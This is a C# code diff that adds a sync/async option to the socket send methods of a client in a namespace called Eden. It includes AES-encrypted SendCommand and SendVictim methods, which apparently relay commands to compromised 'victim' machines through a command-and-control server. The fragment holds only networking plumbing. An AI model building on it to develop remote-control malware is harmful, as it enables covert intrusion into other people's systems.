@@ -243,39 +243,45 @@ namespace Eden
             catch (Exception ex)
             {
                 MessageBox.Show(ex.Message);
-                throw ex;
             }
 
             SocketDisconnect?.Invoke(this, null);
         }
 
-        public void Send(int nCmd, int nParam, byte[] abMsg)
+        public void Send(int nCmd, int nParam, byte[] abMsg, bool bAsync = true)
         {
             byte[] abBuffer = new EP((byte)nCmd, (byte)nParam, abMsg).GetBytes();
             try
             {
-                m_sktServ.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
+                if (bAsync)
                 {
-                    m_sktServ.EndSend(ar);
-                }), abBuffer);
+                    m_sktServ.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
+                    {
+                        m_sktServ.EndSend(ar);
+                    }), abBuffer);
+                }
+                else
+                {
+                    m_sktServ.Send(abBuffer);
+                }
             }
             catch (Exception ex)
             {
                 MessageBox.Show(ex.Message);
             }
         }
-        public void Send(int nCmd, int nParam, string szMsg)
+        public void Send(int nCmd, int nParam, string szMsg, bool bAsync = true)
         {
-            Send(nCmd, nParam, Encoding.UTF8.GetBytes(szMsg));
+            Send(nCmd, nParam, Encoding.UTF8.GetBytes(szMsg), bAsync);
         }
 
-        public void SendCipher(int nCmd, int nParam, string szMsg)
+        public void SendCipher(int nCmd, int nParam, string szMsg, bool bAsync = true)
         {
             byte[] abPlain = Encoding.UTF8.GetBytes(szMsg);
             byte[] abCipher = m_EZAES.Encrypt(abPlain);
             string szCipher = Convert.ToBase64String(abCipher);
 
-            Send(nCmd, nParam, szCipher);
+            Send(nCmd, nParam, szCipher, bAsync);
         }
 
         public void SendCmdParam(int nCmd, int nParam)
@@ -283,14 +289,14 @@ namespace Eden
             Send(nCmd, nParam, clsTools.GenerateRandomString());
         }
 
-        public void SendCommand(string szMsg)
+        public void SendCommand(string szMsg, bool bAsync = true)
         {
-            SendCipher(SERVER_COMMAND.nCmd, SERVER_COMMAND.nParam, $"user|{m_szUsername}|{szMsg}");
+            SendCipher(SERVER_COMMAND.nCmd, SERVER_COMMAND.nParam, $"user|{m_szUsername}|{szMsg}", bAsync);
         }
 
-        public void SendVictim(string szVictimID, string szMsg)
+        public void SendVictim(string szVictimID, string szMsg, bool bAsync = true)
         {
-            SendCipher(SERVER_COMMAND.nCmd, SERVER_COMMAND.nParam, $"victim|{m_szUsername}|{szVictimID}|{szMsg}");
+            SendCipher(SERVER_COMMAND.nCmd, SERVER_COMMAND.nParam, $"victim|{m_szUsername}|{szVictimID}|{szMsg}", bAsync);
         }
 
         public void Disconnect()
